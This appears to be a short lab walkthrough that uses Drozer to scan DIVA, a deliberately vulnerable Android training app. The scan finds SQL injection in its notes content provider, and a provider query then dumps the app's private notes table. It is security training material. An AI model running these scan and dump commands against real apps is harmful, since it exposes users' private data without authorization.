# Using `help` command for detail information #
    
```help scanner.provider.injection```
<br><br>
```help app.provider.query```
<br><br><br>
* **Running `scanner.provider.injection` for scanning available vulnerable content injection**

```
dz> run scanner.provider.injection -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Not Vulnerable:
  content://jakhar.aseem.diva.provider.notesprovider
  content://jakhar.aseem.diva.provider.notesprovider/

Injection in Projection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes

Injection in Selection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes
```

* **Running `app.provider.query` for dump all tables field**
```
dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes/ --projection "*"
| _id | title    | note                                 |
| 5   | Exercise | Alternate days running               |
| 4   | Expense  | Spent too much on home theater       |
| 6   | Weekend  | b333333333333r                       |
| 3   | holiday  | Either Goa or Amsterdam              |
| 2   | home     | Buy toys for baby, Order dinner      |
| 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |
```
